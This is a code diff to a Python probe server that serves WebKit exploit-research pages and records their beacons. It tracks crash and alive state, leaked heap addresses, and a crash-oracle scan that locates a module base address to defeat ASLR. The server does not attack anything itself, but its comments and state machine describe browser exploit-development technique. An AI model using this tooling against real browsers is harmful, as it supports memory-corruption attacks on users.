@@ -37,9 +37,15 @@ ROOT = pathlib.Path(__file__).resolve().parent
 PROJECT = ROOT.parent.parent
 
 STATIC = {
-    '/': PROJECT / 'probes' / 'phase13_webkit' / 'p688-freelist-exhaustion.html',
+    '/': PROJECT / 'probes' / 'phase13_webkit' / 'p710-base-discovery.html',
+    '/p710': PROJECT / 'probes' / 'phase13_webkit' / 'p710-base-discovery.html',
+    '/p691': PROJECT / 'probes' / 'phase13_webkit' / 'p691-walk-forge-fixed.html',
+    '/p690': PROJECT / 'probes' / 'phase13_webkit' / 'p690-walk-forge-oracle.html',
+    '/p689': PROJECT / 'probes' / 'phase13_webkit' / 'p689-walk-trigger-oracle.html',
+    '/p688-full': PROJECT / 'probes' / 'phase13_webkit' / 'p688-freelist-exhaustion.html',
     '/p686': PROJECT / 'probes' / 'phase13_webkit' / 'p686-fontface-impl-bisect.html',
     '/p688': PROJECT / 'probes' / 'phase13_webkit' / 'p688-freelist-exhaustion.html',
+    '/p688b': PROJECT / 'probes' / 'phase13_webkit' / 'p688b-freelist-exhaust-leak.html',
     '/p685': PROJECT / 'probes' / 'phase13_webkit' / 'p685-fontface-walk-dispatch.html',
     '/p684': PROJECT / 'probes' / 'phase13_webkit' / 'p684-canvas-ab-identify-reclaimer.html',
     '/p683': PROJECT / 'probes' / 'phase13_webkit' / 'p683-canvas-ab-property-sweep.html',
@@ -125,6 +131,35 @@ P686_STATE = {'pendingArm': None, 'alive': False, 'armFrom': None,
 # /p688reset=1&mode=reclaim to isolate freelist behavior.
 P688_STATE = {'pendingArm': None, 'alive': False, 'armFrom': None,
                 'mode': None}
+
+# p689 walk-trigger oracle state: same shape as p686. A crash restart
+# invalidates the leaked T/W pair (heap addresses of the dead process), so
+# the page polls /p689state before beaconing its own START; a pending arm
+# with alive still False means that arm's load died and the next load must
+# re-prime.
+P689_STATE = {'pendingArm': None, 'alive': False, 'armFrom': None,
+                'mode': None}
+
+P690_STATE = {'pendingArm': None, 'alive': False, 'armFrom': None,
+                'mode': None}
+
+P710_STATE = {
+    'phase': 'idle',      # idle | coarse | fine | header | header-back | done
+    'scanAddr': None,     # current scan address (int)
+    'lastOk': None,       # last address that returned data (int)
+    'lastCrash': None,    # last address that crashed (int)
+    'vp': None,           # VP from walk chain (int)
+    's2': None,           # s2 (lowest code addr) from walk chain (int)
+    'base': None,         # discovered base address (int)
+    'rva': None,          # VP - base once found (int)
+    'step': 0x400000,     # current step size
+    'done': False,
+    'armed': None,        # address armed for current read
+    'armDelta': None,     # VP - armed address (survives ASLR re-randomization)
+    'okDelta': None,      # VP - lastOk (VP-relative, survives reboot)
+    'crashDelta': None,   # VP - lastCrash (VP-relative)
+    'alive': False,       # reset on ARM, set on ALIVE
+}
 
 
 _LOG_ESCAPES = str.maketrans({
@@ -481,6 +516,126 @@ class ProbeHandler(http.server.BaseHTTPRequestHandler):
             self.wfile.write(b'OK')
             return
 
+        # p689 walk-trigger oracle state: GET /p689state
+        if path == '/p689state':
+            died = (not P689_STATE['alive']) and P689_STATE['pendingArm'] is not None
+            body = json.dumps({'died': died, 'deadArm': P689_STATE['pendingArm'],
+                               'armFrom': P689_STATE['armFrom'],
+                               'mode': P689_STATE['mode']}).encode()
+            self.send_response(200)
+            self.send_header('Content-Type', 'application/json')
+            self.send_header('Content-Length', str(len(body)))
+            self.send_header('Cache-Control', 'no-store')
+            self.end_headers()
+            self.wfile.write(body)
+            return
+
+        # p689 operator reset / rewind: GET /p689reset=1[&arm=N|&arm=clear]
+        if 'p689reset=1' in parsed.query:
+            qs = parse_qs(parsed.query)
+            P689_STATE['pendingArm'] = None
+            P689_STATE['alive'] = False
+            if 'arm' in qs:
+                raw = qs['arm'][0]
+                if raw == 'clear':
+                    P689_STATE['armFrom'] = None
+                else:
+                    try:
+                        P689_STATE['armFrom'] = int(raw, 0)
+                    except ValueError:
+                        pass
+            if 'mode' in qs:
+                P689_STATE['mode'] = qs['mode'][0]
+            self.send_response(200)
+            self.send_header('Content-Type', 'text/plain')
+            self.send_header('Content-Length', 2)
+            self.send_header('Cache-Control', 'no-store')
+            self.end_headers()
+            self.wfile.write(b'OK')
+            return
+
+        # p690 walk-forge-oracle state: GET /p690state
+        if path == '/p690state':
+            died = (not P690_STATE['alive']) and P690_STATE['pendingArm'] is not None
+            body = json.dumps({'died': died, 'deadArm': P690_STATE['pendingArm'],
+                               'armFrom': P690_STATE['armFrom'],
+                               'mode': P690_STATE['mode']}).encode()
+            self.send_response(200)
+            self.send_header('Content-Type', 'application/json')
+            self.send_header('Content-Length', str(len(body)))
+            self.send_header('Cache-Control', 'no-store')
+            self.end_headers()
+            self.wfile.write(body)
+            return
+
+        # p690 operator reset: GET /p690reset=1
+        if 'p690reset=1' in parsed.query:
+            qs = parse_qs(parsed.query)
+            P690_STATE['pendingArm'] = None
+            P690_STATE['alive'] = False
+            if 'arm' in qs:
+                raw = qs['arm'][0]
+                if raw == 'clear':
+                    P690_STATE['armFrom'] = None
+                else:
+                    try:
+                        P690_STATE['armFrom'] = int(raw, 0)
+                    except ValueError:
+                        pass
+            if 'mode' in qs:
+                P690_STATE['mode'] = qs['mode'][0]
+            self.send_response(200)
+            self.send_header('Content-Type', 'text/plain')
+            self.send_header('Content-Length', 2)
+            self.send_header('Cache-Control', 'no-store')
+            self.end_headers()
+            self.wfile.write(b'OK')
+            return
+
+        # p710 base discovery state: GET /p710state
+        if path == '/p710state':
+            died = (P710_STATE['armed'] is not None and not P710_STATE['alive']
+                    and P710_STATE['phase'] != 'idle')
+            body = json.dumps({
+                'phase': P710_STATE['phase'],
+                'scanAddr': hex(P710_STATE['scanAddr']) if P710_STATE['scanAddr'] is not None else None,
+                'lastOk': hex(P710_STATE['lastOk']) if P710_STATE['lastOk'] is not None else None,
+                'lastCrash': hex(P710_STATE['lastCrash']) if P710_STATE['lastCrash'] is not None else None,
+                'vp': hex(P710_STATE['vp']) if P710_STATE['vp'] is not None else None,
+                's2': hex(P710_STATE['s2']) if P710_STATE['s2'] is not None else None,
+                'base': hex(P710_STATE['base']) if P710_STATE['base'] is not None else None,
+                'rva': hex(P710_STATE['rva']) if P710_STATE['rva'] is not None else None,
+                'step': P710_STATE['step'],
+                'done': P710_STATE['done'],
+                'died': died,
+                'deadArm': hex(P710_STATE['armed']) if died and P710_STATE['armed'] is not None else None,
+                'armDelta': P710_STATE['armDelta'],
+                'okDelta': P710_STATE['okDelta'],
+                'crashDelta': P710_STATE['crashDelta'],
+            }).encode()
+            self.send_response(200)
+            self.send_header('Content-Type', 'application/json')
+            self.send_header('Content-Length', str(len(body)))
+            self.send_header('Cache-Control', 'no-store')
+            self.end_headers()
+            self.wfile.write(body)
+            return
+
+        # p710 reset: GET /p710reset
+        if path == '/p710reset':
+            P710_STATE.update({'phase': 'idle', 'scanAddr': None, 'lastOk': None,
+                'lastCrash': None, 'vp': None, 's2': None, 'base': None,
+                'rva': None, 'step': 0x400000, 'done': False, 'armed': None,
+                'armDelta': None, 'okDelta': None, 'crashDelta': None,
+                'alive': False})
+            self.send_response(200)
+            self.send_header('Content-Type', 'text/plain')
+            self.send_header('Content-Length', 2)
+            self.send_header('Cache-Control', 'no-store')
+            self.end_headers()
+            self.wfile.write(b'OK')
+            return
+
         if path.startswith('/beacon'):
             if path == '/beacon':
                 qs = parse_qs(parsed.query)
@@ -582,6 +737,75 @@ class ProbeHandler(http.server.BaseHTTPRequestHandler):
                 P688_STATE['alive'] = False
             elif msg.startswith('P688-ALIVE'):
                 P688_STATE['alive'] = True
+            elif msg.startswith('P689-START'):
+                m = re.search(r'arm=(-?\d+)', msg)
+                P689_STATE['pendingArm'] = int(m.group(1)) if m else None
+                P689_STATE['alive'] = False
+            elif msg.startswith('P689-ALIVE'):
+                P689_STATE['alive'] = True
+            elif msg.startswith('P690-START'):
+                m = re.search(r'arm=(-?\d+)', msg)
+                P690_STATE['pendingArm'] = int(m.group(1)) if m else None
+                P690_STATE['alive'] = False
+            elif msg.startswith('P690-ALIVE'):
+                P690_STATE['alive'] = True
+            elif msg.startswith('P710-ARM-'):
+                if P710_STATE['armed'] is not None and not P710_STATE['alive']:
+                    P710_STATE['lastCrash'] = P710_STATE['armed']
+                m = re.search(r'addr=(0x[0-9a-fA-F]+)', msg)
+                if m:
+                    P710_STATE['armed'] = int(m.group(1), 16)
+                    P710_STATE['alive'] = False
+            elif msg.startswith('P710-ALIVE'):
+                P710_STATE['alive'] = True
+            elif msg.startswith('P710-READ-'):
+                m = re.search(r'addr=(0x[0-9a-fA-F]+)', msg)
+                if m:
+                    P710_STATE['lastOk'] = int(m.group(1), 16)
+                    P710_STATE['alive'] = True
+            elif msg.startswith('P710-VP-'):
+                m = re.search(r'VP=(0x[0-9a-fA-F]+),s2=(0x[0-9a-fA-F]+)', msg)
+                if m:
+                    P710_STATE['vp'] = int(m.group(1), 16)
+                    P710_STATE['s2'] = int(m.group(2), 16)
+            elif msg.startswith('P710-PHASE-'):
+                m = re.search(r'PHASE-(\w+)', msg)
+                if m:
+                    P710_STATE['phase'] = m.group(1)
+            elif msg.startswith('P710-BASE-'):
+                m = re.search(r'BASE-(0x[0-9a-fA-F]+)', msg)
+                if m:
+                    P710_STATE['base'] = int(m.group(1), 16)
+                    P710_STATE['done'] = True
+                    P710_STATE['phase'] = 'done'
+            elif msg.startswith('P710-STEP-'):
+                m = re.search(r'STEP-(\d+)', msg)
+                if m:
+                    P710_STATE['step'] = int(m.group(1))
+            elif msg.startswith('P710-SCAN-'):
+                m = re.search(r'SCAN-(0x[0-9a-fA-F]+)', msg)
+                if m:
+                    P710_STATE['scanAddr'] = int(m.group(1), 16)
+            elif msg.startswith('P710-LASTCRASH-'):
+                m = re.search(r'LASTCRASH-(0x[0-9a-fA-F]+)', msg)
+                if m:
+                    P710_STATE['lastCrash'] = int(m.group(1), 16)
+            elif msg.startswith('P710-OKDELTA-'):
+                m = re.search(r'OKDELTA-(0x[0-9a-fA-F]+)', msg)
+                if m:
+                    P710_STATE['okDelta'] = int(m.group(1), 16)
+            elif msg.startswith('P710-CRASHDELTA-'):
+                m = re.search(r'CRASHDELTA-(0x[0-9a-fA-F]+)', msg)
+                if m:
+                    P710_STATE['crashDelta'] = int(m.group(1), 16)
+            elif msg.startswith('P710-ARMDELTA-'):
+                m = re.search(r'ARMDELTA-(0x[0-9a-fA-F]+)', msg)
+                if m:
+                    P710_STATE['armDelta'] = int(m.group(1), 16)
+            elif msg.startswith('P710-RVA-'):
+                m = re.search(r'RVA-(0x[0-9a-fA-F]+)', msg)
+                if m:
+                    P710_STATE['rva'] = int(m.group(1), 16)
         except Exception:
             pass
         ts = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
